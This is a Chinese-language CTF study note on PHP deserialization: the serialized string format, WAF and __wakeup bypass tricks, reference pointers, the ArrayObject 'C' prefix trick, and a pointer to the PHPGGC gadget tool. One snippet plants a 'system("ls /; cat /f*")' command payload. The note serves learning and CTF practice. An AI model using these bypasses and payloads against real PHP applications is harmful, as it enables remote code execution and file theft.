# 介绍
	- 用一个字符串表示其他类型（数字，对象等）的数据
- # 结构
	- 语法
		- 对象：`O:<类名字的长度>:"<类的名字>":<属性的数量>:{<各个属性>}`
		- 字符串：`s:<字符串长度>:"<字符串内容>";`
			- 字符串内容不需要转义，PHP会根据前面的长度自动读取相应长度的字符串
	- 示例
		- 空格和换行是为了更加好读，请忽略空格换行和注释
		- ```php
		  O:1:"A":1:{
		      s:4:"aaaa"; // A的属性名：字符串"aaaa"
		      O:1:"B":1:{ // A的属性值：对象B
		          s:4:"bbbb"; // B的属性名：bbbb
		          s:5:"/flag"; // B的属性值：字符串"flag"
		      }
		  }
		  ```
- # 技巧
	- 字符串
		- 使用大写 S 可以自动转义`\61`等符号
			- 比如：`S:1:"\61"`就是字符串`"a"`
		- 可以试试通过改变字符串长度实现字符逃逸
	- 对象
		- unserialize()会把多余的字符串当垃圾处理，读取完后就会丢弃后面的字符
		- protected 变量
			- 会被反序列化成这样`S:7:"\00*\00aaaa";`
		- `O:1:"A":1:`也可以用`O:+1:"A":1:`和`O:1:"A":+1:`代替
		- 对象内可以用指针：`R:2;`指向第二个元素
		  id:: 6478aaed-0cfc-41e3-a12e-55de79af3104
			- 可以这样构造
				- ```php
				  $t = new test;
				  $t -> c = "system(\"ls /; cat /f*\");";
				  $t -> a = & $t -> b;
				  $s = serialize($t);
				  ```
		- `__wakeup`绕过：修改类的键数量
		  id:: 64f02a3a-500c-41de-80fa-f565b1030a3b
		  collapsed:: true
			- ```php
			  <?php
			  
			  class Test {
			      public $a;
			      function __wakeup() {
			          echo "wakeup";
			      }
			      function __destruct() {
			          echo "destruct";
			      }
			  }
			  
			  $t = new Test();
			  $t -> a = "114514";
			  $s = serialize($t);
			  $s = str_replace('"Test":1', '"Test":2', $s);
			  echo serialize($t);
			  $t2 = unserialize($s);
			  var_dump($t2);
			  ?>
			  
			  ```
				-
		- 快速反序列化：参考[[CTF/WP/数博会 贵阳杯]]
		  id:: 64b5744d-1d6c-43e5-95d5-2121b31d0d57
	- 自定义序列化对象在序列化后以C开头，[例题](((64b2aacc-598b-4be7-b7d4-48230820277e)))
	  id:: 64f02a3a-fbd3-41a2-90dd-34399046a38a
		- `ArrayObject`
		  id:: 6569d71e-f0f4-4d99-961c-e306b814b20e
			- 在PHP7及以下版本中其序列化后以`C`开头，在PHP8中`ArrayObject`序列化后仍然以O开头
			- ArrayObject序列化的格式中含有后方数据的字符数量，如果修改了其中的字符串则需要同时修改ArrayObject最前方的长度。
				- ```text
				  C:11:"ArrayObject":95:{x: ...省略
				    ^名字长度         ^ 后方的字符数量
				  ```
			- ```php
			  $o = 123123; // 这是原来的对象
			  $a = new ArrayObject([114 => 514]);
			  $a -> o = $o; // 把它塞进ArrayObject里
			  $o = $a; // 最后反序列化$a后其的开头就是C而不是O或者a，可以用来绕过WAF
			  ```
- # 工具
	- 可以使用[PHPGGC](https://github.com/ambionics/phpggc)自动构建ThinkPHP, Lavaral等的反序列化payload
- # 参考
	- [PHP 内置类的应用](https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0)
- # 另见
	- [[CTF/PHP/原生类]]配合反序列化可以完成发送HTTP请求之类的操作